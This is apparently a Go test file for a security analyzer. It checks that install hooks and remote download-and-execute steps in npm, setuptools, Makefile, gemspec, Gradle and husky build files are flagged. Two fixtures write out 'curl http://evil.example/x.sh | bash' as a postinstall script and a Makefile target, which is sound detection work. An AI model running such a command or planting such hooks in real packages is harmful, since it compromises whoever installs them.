package analyzer

import (
	"context"
	"testing"

	"github.com/domehahn/skil/pkg/skil"
)

func buildFindings(t *testing.T, path, content string) []skil.Finding {
	t.Helper()
	findings, err := NewBuild().Analyze(context.Background(), skil.AnalysisContext{Artifact: artifactWith(path, content)})
	if err != nil {
		t.Fatal(err)
	}
	return findings
}

func TestNPMPostinstallRemoteExecIsDetected(t *testing.T) {
	content := `{"name":"demo","scripts":{"postinstall":"curl http://evil.example/x.sh | bash"}}`
	findings := buildFindings(t, "package.json", content)
	if !hasRule(findings, "SKIL-BUILD-REMOTE-EXEC") {
		t.Fatalf("expected remote download-and-execute in postinstall to be detected: %#v", findings)
	}
}

func TestNPMOrdinaryBuildScriptIsSafe(t *testing.T) {
	content := `{"name":"demo","scripts":{"build":"tsc","test":"jest"}}`
	findings := buildFindings(t, "package.json", content)
	if len(findings) != 0 {
		t.Fatalf("ordinary non-lifecycle build/test scripts should not fire: %#v", findings)
	}
}

func TestNPMInstallHookWithoutRemoteExecIsMediumSignal(t *testing.T) {
	content := `{"name":"demo","scripts":{"postinstall":"node scripts/setup.js"}}`
	findings := buildFindings(t, "package.json", content)
	if !hasRule(findings, "SKIL-BUILD-INSTALL-HOOK") {
		t.Fatalf("expected an install-time hook to be flagged even without remote-exec content: %#v", findings)
	}
	if hasRule(findings, "SKIL-BUILD-REMOTE-EXEC") {
		t.Fatalf("a benign-looking postinstall script should not fire the remote-exec rule: %#v", findings)
	}
}

func TestSetupPyCustomInstallCommandIsDetected(t *testing.T) {
	content := "from setuptools import setup\nfrom setuptools.command.install import install\n\nclass CustomInstall(install):\n    def run(self):\n        install.run(self)\n\nsetup(name=\"demo\", cmdclass={\"install\": CustomInstall})\n"
	findings := buildFindings(t, "setup.py", content)
	if !hasRule(findings, "SKIL-BUILD-INSTALL-HOOK") {
		t.Fatalf("expected a custom setuptools install command override to be detected: %#v", findings)
	}
}

func TestOrdinarySetupPyIsSafe(t *testing.T) {
	content := "from setuptools import setup\nsetup(name=\"demo\", version=\"1.0.0\")\n"
	findings := buildFindings(t, "setup.py", content)
	if len(findings) != 0 {
		t.Fatalf("an ordinary setup.py without a custom install command should not fire: %#v", findings)
	}
}

func TestMakefileRemoteExecIsDetected(t *testing.T) {
	content := "install:\n\tcurl http://evil.example/x.sh | bash\n"
	findings := buildFindings(t, "Makefile", content)
	if !hasRule(findings, "SKIL-BUILD-REMOTE-EXEC") {
		t.Fatalf("expected remote download-and-execute in a Makefile target to be detected: %#v", findings)
	}
}

func TestOrdinaryMakefileIsSafe(t *testing.T) {
	content := "build:\n\tgo build ./...\ntest:\n\tgo test ./...\n"
	findings := buildFindings(t, "Makefile", content)
	if len(findings) != 0 {
		t.Fatalf("an ordinary Makefile should not fire: %#v", findings)
	}
}

func TestHuskyGitHookIsDetected(t *testing.T) {
	findings := buildFindings(t, ".husky/pre-commit", "#!/bin/sh\nnpm test\n")
	if !hasRule(findings, "SKIL-BUILD-INSTALL-HOOK") {
		t.Fatalf("expected a husky git hook to be detected: %#v", findings)
	}
}

func TestGemspecExtensionHookIsDetected(t *testing.T) {
	content := "spec.extensions = ['ext/extconf.rb']\nspec.files = Dir['lib/**/*.rb']\n"
	findings := buildFindings(t, "demo.gemspec", content)
	if !hasRule(findings, "SKIL-BUILD-INSTALL-HOOK") {
		t.Fatalf("expected a .gemspec with extensions to be detected: %#v", findings)
	}
}

func TestOrdinaryGemspecIsSafe(t *testing.T) {
	content := "spec.name = 'demo'\nspec.version = '1.0'\nspec.files = Dir['lib/**/*.rb']\n"
	findings := buildFindings(t, "demo.gemspec", content)
	if hasRule(findings, "SKIL-BUILD-INSTALL-HOOK") {
		t.Fatalf("an ordinary .gemspec without extensions should not fire: %#v", findings)
	}
}

func TestGradleExecTaskIsDetected(t *testing.T) {
	content := "task runScript(type: Exec) {\n  commandLine 'python', 'setup.py'\n}\n"
	findings := buildFindings(t, "build.gradle", content)
	if !hasRule(findings, "SKIL-BUILD-INSTALL-HOOK") {
		t.Fatalf("expected a Gradle Exec task to be detected: %#v", findings)
	}
}

func TestOrdinaryGradleIsSafe(t *testing.T) {
	content := "plugins {\n  id 'java'\n}\nrepositories { mavenCentral() }\n"
	findings := buildFindings(t, "build.gradle", content)
	if hasRule(findings, "SKIL-BUILD-INSTALL-HOOK") {
		t.Fatalf("an ordinary Gradle build without exec tasks should not fire: %#v", findings)
	}
}
